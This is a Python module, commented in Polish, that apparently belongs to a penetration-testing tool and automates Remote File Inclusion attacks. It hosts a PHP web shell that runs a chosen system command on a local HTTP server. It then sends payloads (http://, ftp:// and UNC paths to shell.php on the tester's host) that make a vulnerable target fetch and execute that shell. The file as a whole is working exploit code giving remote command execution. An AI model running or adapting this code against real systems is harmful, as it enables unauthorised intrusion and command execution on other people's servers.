"""RFI (Remote File Inclusion) — payloady + auto-hostowanie web-shella po HTTP.

Wymaga --lhost/--lport (Config już je ma, ale nie było modułu, który by z nich
korzystał). Gdy oba podane, moduł stawia lekki serwer HTTP na 0.0.0.0:{lport}
serwujący web-shell z komendą (+ RCE_MARKER) i wysyła payload wskazujący na
http://{lhost}:{lport}/shell.php — cel sam go pobierze i wykona przy include().

Warianty ftp:// i UNC (\\\\LHOST\\share\\...) są generowane jako payloady, ale
BEZ auto-hostowania — wymagają własnego serwera FTP/SMB po stronie testera,
poza zakresem tego narzędzia (analogicznie do `zip_phar`, który wymaga
wgranego archiwum przez --file).

⚠️ Nie ustawiaj --lhost na adres samego celu — include() zapętli się na
własnej odpowiedzi (self-inclusion).
"""
from __future__ import annotations

import asyncio
from collections.abc import Iterator

from ..config import Encoding
from ..detection import Finding, RCE_MARKER
from ..http_client import HttpClient
from .base import BaseModule


class _ShellServer:
    """Minimalny async serwer HTTP serwujący jeden web-shell pod każdą ścieżką."""

    def __init__(self, port: int, cmd: str):
        self._port = port
        self._body = f"<?php system('echo {RCE_MARKER}; {cmd}'); ?>".encode()
        self._server: asyncio.Server | None = None

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=5)
        except (asyncio.IncompleteReadError, asyncio.TimeoutError, ConnectionError):
            pass
        header = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/octet-stream\r\n"
            b"Content-Length: " + str(len(self._body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n"
        )
        try:
            writer.write(header + self._body)
            await writer.drain()
        except ConnectionError:
            pass
        finally:
            writer.close()

    async def __aenter__(self) -> "_ShellServer":
        self._server = await asyncio.start_server(self._handle, "0.0.0.0", self._port)
        return self

    async def __aexit__(self, *exc) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()


class RFIModule(BaseModule):
    """Remote File Inclusion — wymaga --lhost/--lport; auto-hostuje web-shell po HTTP."""
    name = "rfi"
    description = "RFI (http/ftp/UNC) — z --lhost/--lport auto-hostuje web-shell po HTTP"

    def payloads(self) -> Iterator[str]:
        if not (self.cfg.lhost and self.cfg.lport):
            return
        base = f"{self.cfg.lhost}:{self.cfg.lport}"
        yield f"http://{base}/shell.php"
        yield f"ftp://{base}/shell.php"                    # wymaga własnego serwera FTP
        yield f"\\\\{self.cfg.lhost}\\share\\shell.php"     # UNC, wymaga własnego SMB

    async def run(self, client: HttpClient) -> list[Finding]:
        if not (self.cfg.lhost and self.cfg.lport):
            if self.cfg.verbose:
                print("    [rfi] pominięto — brak --lhost/--lport")
            return []
        findings: list[Finding] = []
        async with _ShellServer(self.cfg.lport, self.cfg.cmd):
            for payload in self.payloads():
                resp = await client.send(payload, encoding=Encoding.NONE)
                if self.cfg.verbose:
                    print(f"    [{resp.status}] {resp.length:>7}B  {payload}")
                finding = self.evaluate(resp)
                if finding.confirmed:
                    findings.append(finding)
        return self.dedup(findings)
